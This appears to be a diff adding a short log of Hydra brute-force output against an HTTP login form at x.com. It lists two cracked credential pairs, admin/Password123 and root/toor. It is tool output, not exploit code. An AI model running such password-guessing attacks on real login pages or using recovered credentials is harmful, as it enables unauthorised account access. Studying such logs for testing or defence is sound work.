@@ -1,0 +1,8 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks
+[DATA] attacking http-post-form://x.com:443/login
+[443][http-post-form] host: x.com   login: admin   password: Password123
+[443][http-post-form] host: x.com   login: root   password: toor
+[STATUS] attack finished for x.com (waiting for children to complete tests)
+1 of 1 target successfully completed, 2 valid passwords found
